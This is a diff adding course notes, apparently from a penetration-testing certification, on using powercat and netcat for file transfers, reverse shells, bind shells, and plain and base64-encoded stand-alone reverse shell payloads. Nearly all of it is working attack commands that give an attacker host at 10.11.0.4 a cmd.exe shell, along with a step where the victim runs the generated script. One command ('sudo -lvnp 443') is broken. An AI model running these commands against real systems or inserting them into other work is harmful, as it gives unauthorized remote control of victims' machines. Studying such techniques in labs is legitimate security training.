@@ -113,7 +113,38 @@ powercat
 powercat -h
 
 #4.3.5 Powercat File Transfers
+## run listener on the target:
+sudo nc -lnvp 443 > receiving_powercat.ps1
+##Using powercat to send a file:
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1    #-c specifies client mode and sets the listening IP address // -i indicates local file to be transfererd remotely
 
+#4.3.6 Powercat Reverse Shells
+##on attacker
+sudo nc -lvp 443
+##on target
+powercat -c 10.11.0.4 -p 443 -e cmd.exe   #-e option specifies the application to execute (cmd.exe) once a connection is made to a listening port
+## we receive the shell on the attacker --> run commands ;]
 
+#4.3.7 Powercat Bind Shells
+##start shell on the target
+powercat -l -p 443 -e cmd.exe       #-l create listener // -p on port // 
+##connect from the attacker machine
+nc 10.11.0.22 443                   #ececute commands ;]
+
+#4.3.8 Powercat Stand-Alone Payloads
+##start listener on attacker machine
+nc -lvnp 443
+##start reverse shell on the victim
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1     #-g generates payload and redirect it to a file reverseshell.ps1
+##the victim must execute this script and we'll receive reverse shell on the attacker machine:
+./reverseshell.ps1        #stand-alone payoads like this could be easily detected dy IDS!!
+##generate encoded payload:
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+##run the encoded payload
+powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQ...==     #paste the base64 encoded payload
+# start listener and receive a stand-alone reverse shell
+sudo -lvnp 443    #run commands ;]
+
+#4.4 Wireshark
 
 
